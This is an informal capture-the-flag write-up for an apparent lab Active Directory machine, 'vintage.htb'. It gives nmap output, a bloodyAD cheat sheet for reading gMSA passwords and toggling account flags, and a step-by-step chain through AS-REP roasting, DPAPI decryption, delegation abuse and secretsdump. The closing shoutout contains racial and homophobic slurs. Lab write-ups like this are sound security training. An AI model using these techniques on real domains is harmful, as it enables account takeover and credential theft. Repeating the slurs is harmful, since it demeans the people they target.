 
```
kali@kali ~> nmap -sC -sV 10.129.109.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 14:46 EST
Nmap scan report for 10.129.109.21
Host is up (0.067s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 19:48:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-02T19:48:36
|_  start_date: N/A
|_clock-skew: 1m30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.39 seconds
```


```python
# Get writable objects
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' get writable

# Get all AD objects
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' get children

# Dump readable DNS records
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' get dnsDump

# Read GMSA password
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' get object 'gmsaAccount$' --attr msDS-ManagedPassword

# Set DONT_REQ_PREAUTH in UAC to harvest account hash
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' add uac $TARGET -f DONT_REQ_PREAUTH

# Remove ACCOUNTDISABLE in UAC to enable an account
bloodyAD --host $FQDN -d $DOMAIN -u $USER -p '$PASSWD' remove uac $TARGET -f ACCOUNTDISABLE

kali@kali ~ [1]> bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'SVC_SQL' --attr useraccountcontrol

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH

```


 rosa parks -> windows pre 2000 -> fs01$ workstation has the creds `fs01$:fs01` -> GMSA ON gmsa01$ user -> generic write on servicemanagers -> generic all on the SVC_* (SQL, ARK, LDAP) -> run Targetted ASREPRoasting -> realise  that SQL is disabled for some reason -> remove accountdisable UAC bit from the SVC account using bloodyAD also add NotReqPreAuth -> we get the hash and crack it -> spray the hash -> get initial access on c.neri -> winrm in -> DPAPI attack in roaming decrypt it with masterkey to get password -> password is for c.neri_adm -> c.neri_adm has genericwrite over delegatedadmins -> RBCD from delegatedadmins to the DC but the machine quoata is 0 what do? -> use FS01 as a workstation since we already know this passwords (figured out by my no help from mojo cuz im so cool smart sexy and handsome) so we use c.neri_adm to ADD fs01 to deleg admins -> find out that the SID is already added to the msds-allowedtoactonbehalfofotheridentity -> run getST -> for some reason we get `STATUS_LOGON_TYPE` [error](https://learn.microsoft.com/en-us/troubleshoot/power-platform/power-automate/desktop-flows/logon-type-has-not-been-granted) this means that `"Deny" permissions take precedence over "Allow" permissions unless specific exceptions are configured at the domain controller level.` , so we cant use administrator instead we opt to requesting the machine TGT -> secretsdump using the machine TGT -> ez win (all me trust) shoutout **mojoniggafggot4206969**
